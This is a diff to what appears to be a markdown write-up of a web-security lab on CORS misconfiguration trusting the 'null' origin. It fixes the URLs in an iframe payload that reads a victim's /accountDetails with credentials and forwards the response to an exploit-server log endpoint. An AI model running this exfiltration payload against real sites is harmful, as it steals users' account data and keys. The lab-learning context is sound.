@@ -19,11 +19,11 @@ This lab exploited **insecure CORS trusting the** `"null"` **origin**, allowing 
    <iframe sandbox="allow-scripts" srcdoc="<script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
     req.withCredentials = true;
     req.send();
     function reqListener() {
-        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+this.responseText;
+        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+this.responseText;
     };
     </script>"></iframe>
    ```
